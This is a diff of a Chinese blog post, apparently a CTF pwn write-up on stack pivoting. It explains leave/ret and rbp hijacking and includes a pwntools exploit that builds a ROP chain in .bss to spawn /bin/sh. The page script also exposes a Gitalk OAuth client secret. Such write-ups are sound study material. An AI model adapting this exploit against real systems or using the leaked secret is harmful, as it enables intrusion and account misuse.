@@ -6,16 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://l0tus.vip">
-  <title>Tag: 社交 | L0tus&#39; blog</title>
+  <title>谈谈最近学到的简单的东西（十） | L0tus&#39; blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="L0tus&#39; blog">
-<meta property="og:url" content="http://l0tus.vip/tags/%E7%A4%BE%E4%BA%A4/index.html">
+  <meta name="description" content="Stackmove">
+<meta property="og:type" content="article">
+<meta property="og:title" content="谈谈最近学到的简单的东西（十）">
+<meta property="og:url" content="http://l0tus.vip/2022/12/15/stackmove/index.html">
 <meta property="og:site_name" content="L0tus&#39; blog">
+<meta property="og:description" content="Stackmove">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_5.png">
+<meta property="article:published_time" content="2022-12-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-15T15:56:38.715Z">
 <meta property="article:author" content="L0tus">
-<meta property="article:tag" content="C++">
+<meta property="article:tag" content="pwn笔记">
+<meta property="article:tag" content="stackmove">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_1.png">
   
     <link rel="alternative" href="/atom.xml" title="L0tus&#39; blog" type="application/atom+xml">
   
@@ -159,73 +170,220 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-stackmove" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2077" class="archive-year">2077</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2077/09/12/%E8%A7%84%E5%88%92/" class="archive-article-date">
-  	<time datetime="2077-09-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2077-09-12</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2077/09/12/%E8%A7%84%E5%88%92/">近期的规划</a>
+    <h1 class="article-title" itemprop="name">
+      谈谈最近学到的简单的东西（十）
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        <!--显示阅读次数-->
+        
+          <br/>
+         <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+         <span class="icon-sort"></span>
+         <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+          	阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+          </span>
+          </a>
+        
+        <!--显示阅读次数完毕-->
+        
+        <a href="/2022/12/15/stackmove/" class="archive-article-date">
+  	<time datetime="2022-12-14T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-12-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Stackmove"><a href="#Stackmove" class="headerlink" title="Stackmove"></a>Stackmove</h1><span id="more"></span>
+<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>近期的进度应该已经进入堆题的学习阶段了，但是我还没有完整做过一道栈迁移的题。倍感惭愧，正好前几天赛博的比赛nameless✌出了一道栈迁移，可惜当时时间很紧。我的想法是现学堆题的知识，然后把ez_heap整出来，但是我太菜了就把大把的时间花费在了理解堆管理器上，到结束也没做出来。也就没心思看这道栈迁移了，不过回头看来，这道题应该是当时可以拿下的。</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_1.png" alt="test"><br>题目给了execve的地址，可以直接拿来利用。在main函数里有一次read用来布置目标栈<br>vul函数里有一次read用来劫持rbp、rsp<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_2.png" alt="test"><br>利用ROPgadget可以找到<strong>pop rsi r15</strong>和<strong>pop rdi</strong>,用来布置栈<br>利用栈迁移时需要用到两条关键的汇编指令：<br><strong>leave</strong> 相当于 <strong>mov esp，ebp；pop ebp</strong><br><strong>ret</strong> 相当于 <strong>pop eip</strong><br>我们需要做的就是劫持rbp,将其覆盖为我们想要迁移的位置，再使用leave这条指令，将rbp传入rsp，从而使劫持程序，让其返回到我们布置好的栈上。<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_3.png" alt="test"><br>这是布置好的bss段和buf<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_4.png" alt="test"><br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stackmove_5.png" alt="test"><br>调试的时候可以看到一些关键的覆盖</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>直接从nameless✌那里抄来的exp，懒狗懒得自己写了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=remote(&#x27;124.222.96.143&#x27;,10000)</span></span><br><span class="line">io=process(<span class="string">&quot;./stackmove&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stackmove&#x27;</span>)<span class="comment">#io=process(&#x27;./b&#x27;)</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x400851</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400853</span></span><br><span class="line">lea_ret=<span class="number">0x400708</span></span><br><span class="line">stack_addr=<span class="number">0x600ca0</span></span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;global_buf:&#x27;)</span></span><br><span class="line"><span class="comment">#stack_addr=int(io.recv(8),16)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;execv:&#x27;</span>)</span><br><span class="line">execv_addr=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">payload1=p64(pop_rdi_ret)+p64(stack_addr)+p64(pop_rsi_r15_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execv_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;global:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input:&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span>+p64(stack_addr)+p64(lea_ret)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive( )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">规划</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pwn笔记</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">汇编语言</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">英语</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">社交</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">stackmove</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://l0tus.vip/2022/12/15/stackmove/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+
+
+  
+<nav id="article-nav">
+  
+    <a href="/2077/09/12/%E8%A7%84%E5%88%92/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          近期的规划
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2022/12/14/ez_heap/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">谈谈最近学到的简单的东西（九）</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
 
+  
+
+  
+
+
+
+  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+if(true){
+    var gitalk = new Gitalk({
+    clientID: 'd7ed634dc972bb7fd909',
+    clientSecret: 'fb780f732ab4e8af3a1059bd864c85b1b5235496',
+    repo: 'comments.github.io',
+    owner: 'ChrisL0tus',
+    admin: ['ChrisL0tus'],
+    id: 'Thu Dec 15 2022 00:00:00 GMT+0800',
+    distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+  
 
           </div>
         </div>
@@ -257,9 +415,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
